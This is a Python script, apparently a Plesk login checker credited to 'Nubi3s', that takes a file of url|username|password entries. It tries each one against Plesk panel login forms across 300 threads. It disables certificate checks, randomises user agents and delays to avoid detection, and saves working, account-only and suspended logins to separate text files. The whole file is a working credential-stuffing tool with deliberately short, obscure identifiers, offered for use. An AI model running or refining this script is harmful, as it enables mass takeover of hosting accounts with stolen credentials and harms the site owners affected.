import re
import requests
import time
import random
import os
from urllib.parse import urlparse
from queue import Queue
import threading
import urllib3
import colorama
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

T1 = 0
T2 = 0
T3 = 0

Q1 = Queue()

# def G1():
#     if not os.path.exists('plesk'):
#         os.makedirs('plesk')

def G2(X):
    X = X.strip().replace('\ufeff', '')
    A = urlparse(X)
    if A.scheme == '':
        return 'https://' + X
    return X

def G3():
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1'
    ])

def G4(X):
    global T1, T2, T3
    # G1()
    L = re.split(r'[:|]', X)
    G = None
    if len(L) >= 3:
        G = G2(':'.join(L[:-2]))
        M = L[-2]
        P = L[-1]
        try:
            V = requests.Session()
            S = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': G3(), 'Connection': 'keep-alive'}
            time.sleep(random.uniform(1.5, 4.0))
            K = V.get(G, timeout=15, verify=False)
            C = K.cookies.get_dict()
            S['Cookie'] = '; '.join([f'{K}={V}' for K, V in C.items()])
            D = {'login_name': M, 'passwd': P, 'locale_id': 'en-US'}
            R = V.post(G, headers=S, data=D, timeout=20, verify=False)
            Y = f'{G}|{M}|{P}'
            if '/smb/web/' in R.url:
                print(f'[SUCCESS - WEB] {Y}')
                T3 += 1
                with open('good.txt', 'a') as f:
                    f.write(f'{Y}\n')
            elif '/smb/account' in R.url:
                print(f'[SUCCESS - ACCOUNT] {Y}')
                T3 += 1
                with open('kosongan.txt', 'a') as f:
                    f.write(f'{Y}\n')
            elif '/smb/id' in R.url:
                print(f'[SUSPENDED] {Y}')
                T3 += 1
                with open('suspend.txt', 'a') as f:
                    f.write(f'{Y}\n')
            else:
                print(f'[FAILED LOGIN] {Y}')
                T2 += 1
            T1 += 1
        except requests.Timeout:
            print(f'[TIMEOUT] {G}')
        except requests.exceptions.MissingSchema:
            print(f'[INVALID URL SCHEMA] {G} → Skipping')
        except requests.exceptions.RequestException as e:
            print(f'[REQUEST ERROR] {G}: {e}')
    else:
        print(f'[INVALID FORMAT] {X}')

def G5():
    while True:
        X = Q1.get()
        if X is None:
            break
        G4(X)
        Q1.task_done()

def G6(X, N=10):
    try:
        with open(X, 'r', encoding='utf-8') as F:
            L = F.readlines()
            for Q in L:
                if Q.strip():
                    Q1.put(Q.strip())
        W = []
        for _ in range(N):
            T = threading.Thread(target=G5)
            T.start()
            W.append(T)
        Q1.join()
        for _ in range(N):
            Q1.put(None)
        for T in W:
            T.join()
    except FileNotFoundError:
        print(f"[ERROR] File {X} tidak ditemukan.")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    banners = r'''
._______ .___    ._______.________.____/\ ._______ .___.__  ._______._______ .____/\ ._______.______  
: ____  ||   |   : .____/|    ___/:   /  \:_.  ___\:   |  \ : .____/:_.  ___\:   /  \: .____/: __   \ 
|    :  ||   |   | : _/\ |___    \|.  ___/|  : |/\ |   :   || : _/\ |  : |/\ |.  ___/| : _/\ |  \____|
|   |___||   |/\ |   /  \|       /|     \ |    /  \|   .   ||   /  \|    /  \|     \ |   /  \|   :  \ 
|___|    |   /  \|_.: __/|__:___/ |      \|. _____/|___|   ||_.: __/|. _____/|      \|_.: __/|   |___\
         |______/   :/      :     |___\  / :/          |___|   :/    :/      |___\  /   :/   |___|    
                                       \/  :                         :            \/                 
                                      
                                    {}    github.com/Nubi3s
'''.format(Fore.RESET)
    print(banners)

if __name__ == "__main__":
    clear_screen()
    banner()
    filename = input("Nubi3s> ")
    G6(filename, 300)
